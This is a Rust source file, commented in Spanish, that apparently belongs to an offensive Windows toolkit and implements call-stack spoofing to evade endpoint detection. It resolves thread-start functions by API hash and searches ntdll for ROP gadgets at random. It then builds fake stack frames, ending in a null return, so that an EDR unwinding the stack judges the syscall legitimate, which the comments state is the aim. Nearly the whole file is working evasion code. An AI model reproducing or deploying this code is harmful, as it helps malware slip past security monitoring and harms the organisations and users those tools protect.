use super::unwind_info::*;
use crate::memory::process::pattern_scan_mem::pdata_pattern_find_starting_at_rand_func;
use crate::techniques::evasion::dinamic_api_resolution::{
    get_export_by_name_hash, get_kernel32_base, get_ntdll_base,
};

/*
IDEAS PARA SER MAS ROBUSTOS:
1. buscar patrones en mas dlls no solo ntdll
*/

/*
================================================================================
[RSP + pos4] -> pos4 (0x00): Dirección de Gadget 1 (ADD RSP, 0x38; RET)
                             (La Syscall real de NTDLL hace RET y aterriza aquí)
[RSP + 0x08] -> Shadow Space 1 (Basura / RCX)
[RSP + 0x10] -> Shadow Space 2 (Basura / RDX)
[RSP + 0x18] -> Shadow Space 3 (Basura / R8)
[RSP + 0x20] -> Shadow Space 4 (Basura / R9)
[RSP + 0x28] -> ARGUMENTO 5 (Sobrevive intacto, empujado por Rust antes de saltar)
[RSP + 0x30] -> ARGUMENTO 6
================================================================================
...          -> El Gadget 1 ejecuta "ADD RSP, 0x38" (Limpiando la basura de arriba).
                Acto seguido ejecuta "RET", sacando la dirección en RSP + 0x38.
================================================================================
[RSP + pos3] -> pos3 (pos4 + offset4 + 8): Dirección de Gadget 2 (CALL RDI / REG)
                             (El flujo aterriza aquí. Al ser un "CALL", ensucia
                              8 bytes, pero nos devuelve el control al código Rust) -> da igual ensuciar 8 bytes por que al final de la syscall spoofeada se restaura
================================================================================
...          -> Espacio asignado al frame de Gadget 2 (offset3 extraído del .pdata)
================================================================================
[RSP + pos2] -> pos2 (pos3 + offset3 + 8): BaseThreadInitThunk + 0x14
================================================================================
...          -> Espacio asignado al frame de BaseThreadInitThunk (offset2)
================================================================================
[RSP + pos1] -> pos1 (pos2 + offset2 + 8): RtlUserThreadStart + 0x21
================================================================================
...          -> Espacio asignado al frame de RtlUserThreadStart (offset1)
                (+ 8 bytes del "POP" virtual calculado por el EDR al desenrollar)
================================================================================
[RSP + null] -> null_ret_offset (pos1 + offset1 + 8): 0x0000000000000000
                (El EDR lee el 0, asume que es el origen
                 legítimo del hilo y da su análisis por terminado y limpio).
================================================================================
*/

#[repr(C)]
#[derive(Debug)]
pub struct SpoofData {
    pub final_offset: usize, // size total del stack a spoofear
    pub pos1: usize,
    pub fn_addr_1: usize, //rtluserthreadstart addr
    pub pos2: usize,
    pub fn_addr_2: usize, //basethreadinitthunk addr
    pub pos3: usize,
    pub fn_addr_3: usize, //gadget 1 addr (random gadget) - limpieza de pila del shadow space y args 5 y 6 (imprescindible)
    pub pos4: usize,
    pub fn_addr_4: usize, //gadget 2 addr (random gadget) - ancla
    pub null_ret_offset: usize,
    pub anchor_register: Reg, // registro ancla seleccionado (del gadget 2)
}

#[repr(C)]
#[derive(Debug)]
pub enum Reg {
    Rdi,
    Rsi,
    R15,
    R12,
}
pub struct Gadgets {
    pub gadget_addr_1: usize,
    pub gadget_addr_2: usize,
    pub anchor_register: Reg, // este sera el registro que usaremos para saltar a nuestro codigo
}

pub fn prepare_spoof_data() -> Result<SpoofData, String> {
    let func1_hash: u32 = 0xec14be5f; // RtlUserThreadStart
    let func2_hash: u32 = 0x9941b145; // BaseThreadInitThunk

    let ntdll_base = unsafe { get_ntdll_base()? };
    let kernel32_base = unsafe { get_kernel32_base()? };

    let orig_fn_addr_1 = match get_export_by_name_hash(ntdll_base, func1_hash) {
        Ok(addr) => addr as usize,
        Err(e) => return Err(format!("RtlUserThreadStart not found: {}", e)),
    };
    let orig_fn_addr_2 = match get_export_by_name_hash(kernel32_base, func2_hash) {
        Ok(addr) => addr as usize,
        Err(e) => return Err(format!("BaseThreadInitThunk not found: {}", e)),
    };

    let fn_addr_1 = orig_fn_addr_1 + 0x21; // este es un detalle que no rompe la funcionalidad, simplemente es para evitar que el edr vea que el ret esta al principio de esa funcion (lo cual seria imposible al supuestamente haber entrado por un call)
    let fn_addr_2 = orig_fn_addr_2 + 0x14;

    let gadgets = match prepare_gadget_spoof_data(ntdll_base) {
        Some(gadgets) => gadgets,
        None => return Err(String::from("Gadgets not found")),
    };
    let func4_addr_gadget_1 = gadgets.gadget_addr_1;
    let func3_addr_gadget_2 = gadgets.gadget_addr_2;
    let anchor_register = gadgets.anchor_register;

    let offset1 = match get_unwind_offsets(orig_fn_addr_1, ntdll_base) {
        Ok(Some(size)) => size as usize,
        _ => return Err(String::from("Failed to get offset1")),
    };
    let offset2 = match get_unwind_offsets(orig_fn_addr_2, kernel32_base) {
        Ok(Some(size)) => size as usize,
        _ => return Err(String::from("Failed to get offset2")),
    };
    let offset3 = match get_unwind_offsets(func3_addr_gadget_2, ntdll_base) {
        Ok(Some(size)) => size as usize,
        _ => return Err(String::from("Failed to get offset3")),
    };
    let offset4 = match get_unwind_offsets(func4_addr_gadget_1, ntdll_base) {
        Ok(Some(size)) => size as usize,
        _ => return Err(String::from("Failed to get offset4")),
    };
    //posiciones de los returns de cada funcion spoofeada
    let pos4 = 0;
    let pos3 = pos4 + offset4 + 8; // se mete un + 8 dado que hay que contar con el ret que ocupa 8 bytes
    let pos2 = pos3 + offset3 + 8;
    let pos1 = pos2 + offset2 + 8;

    let null_ret_offset = pos1 + offset1 + 8; // aqui metemos el null que servira para parar el unwinding (seria como un return null)

    let mut final_offset = pos1 + offset1 + 8;
    final_offset = (final_offset + 15) & !15;
    final_offset += 8;

    Ok(SpoofData {
        final_offset,
        pos1,
        fn_addr_1,
        pos2,
        fn_addr_2,
        pos3,
        fn_addr_3: func3_addr_gadget_2,
        pos4,
        fn_addr_4: func4_addr_gadget_1,
        null_ret_offset,
        anchor_register,
    })
}

pub fn prepare_gadget_spoof_data(dll_base: *const u8) -> Option<Gadgets> {
    let func_arg_size = 0x38; // esto es constante, para una llamada con 2 args pusheados a la pila y 4 registros guardados se necesita limpiar esa cantidad de bytes
    let pattern_gadget_1: &[&[u8]] = &[&[0x48, 0x83, 0xC4, func_arg_size, 0xC3]]; // ADD RSP, 0x38; RET
    let finded_addr_gadget_1;
    let index_gadget_1;

    loop {
        match pdata_pattern_find_starting_at_rand_func(dll_base, pattern_gadget_1) {
            Some((addr, index)) => {
                let pdata_size = match get_unwind_offsets(addr, dll_base) {
                    Ok(Some(size)) => size,
                    _ => continue,
                };
                if pdata_size as usize == func_arg_size as usize {
                    // necesitmos especificamente 0x38 de stack en la funcion de este gadget
                    finded_addr_gadget_1 = addr;
                    index_gadget_1 = index;
                    #[cfg(debug_assertions)]
                    println!(
                        "[Debug] Gadget1 found at address: {:#x}, index: {}, stack size equal than gadget cleaning!",
                        addr, index_gadget_1
                    );
                    break;
                }
            }
            None => return None,
        };
    }
    let relative_addr_1 = finded_addr_gadget_1 - dll_base as usize;
    #[cfg(debug_assertions)]
    println!(
        "[Debug] [+] Gadget1 ADD RSP, 0x38; RET found at address: {:#x}, relative: {:#x}, index: {}",
        finded_addr_gadget_1, relative_addr_1, index_gadget_1
    );
    let pattern_gadget_2: &[&[u8]] = &[
        //cualquiera de estos nos vale
        &[0xFF, 0xD7],       //CALL RDI
        &[0xFF, 0xD6],       //CALL RSI
        &[0x41, 0xFF, 0xD7], //CALL R15
        &[0x41, 0xFF, 0xD4], //CALL R12
    ];
    let mut finded_addr_gadget_2 = 0;
    let mut index_gadget_2 = 0;
    let mut found_g2 = false;
    for _ in 0..1000 {
        if let Some((addr, index)) =
            pdata_pattern_find_starting_at_rand_func(dll_base, pattern_gadget_2)
        {
            if let Ok(Some(_pdata_size)) = get_unwind_offsets(addr, dll_base) {
                finded_addr_gadget_2 = addr;
                index_gadget_2 = index;
                found_g2 = true;
                let relative_addr_2 = finded_addr_gadget_2 - dll_base as usize;

                #[cfg(debug_assertions)]
                println!(
                    "[Debug] [+] Gadget2 CALL RDI or rsi or r15 or r12 found at address: {:#x}, relative: {:#x}, index: {}",
                    finded_addr_gadget_2, relative_addr_2, index_gadget_2
                );
                break;
            }
        }
    }

    if !found_g2 {
        #[cfg(debug_assertions)]
        println!("[Debug] [-] ERROR: No se encontró Gadget 2 válido tras 1000 intentos.");
        return None;
    }
    Some(Gadgets {
        gadget_addr_1: finded_addr_gadget_1,
        gadget_addr_2: finded_addr_gadget_2,
        anchor_register: match index_gadget_2 {
            0 => Reg::Rdi,
            1 => Reg::Rsi,
            2 => Reg::R15,
            3 => Reg::R12,
            _ => unreachable!(),
        },
    })
}
